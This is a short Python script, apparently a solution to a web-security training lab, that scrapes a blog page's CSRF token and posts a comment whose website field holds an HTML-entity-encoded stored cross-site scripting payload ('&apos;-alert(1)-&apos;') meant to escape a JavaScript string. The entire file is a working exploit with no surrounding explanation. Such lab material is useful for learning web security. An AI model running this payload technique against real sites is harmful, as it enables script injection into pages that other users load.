import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
session = requests.Session()

response = session.get(burp_url+'/post?postId=10')
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "postId": "10", "comment": "1", "name": "11", "email": "1@a.com", "website": f"http://foo?&apos;-alert(1)-&apos;"}
session.post(burp_url+'/post/comment', data=burp_data)
